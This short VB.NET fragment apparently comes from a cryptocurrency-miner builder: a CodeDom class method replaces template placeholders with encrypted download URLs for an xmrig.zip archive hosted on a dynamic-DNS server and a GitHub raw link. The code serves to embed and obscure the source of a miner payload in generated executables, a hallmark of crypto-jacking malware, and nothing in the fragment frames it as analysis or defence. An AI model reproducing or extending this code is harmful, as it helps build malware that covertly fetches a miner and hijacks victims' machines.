...
Public Class Codedom
    ...
    Public Shared Sub ReplaceGlobals(ByRef stringb As StringBuilder)
        ...
        stringb.Replace("#SANCTAMMINERURL", F.EncryptString("http://ahmedzx5.duckdns.org:8033/Project/project/Resources/xmrig.zip"))
        stringb.Replace("#MINERURL", F.EncryptString("https://raw.githubusercontent.com/Ahmedzx555/XMR/main/Project/project/Resources/xmrig.zip"))
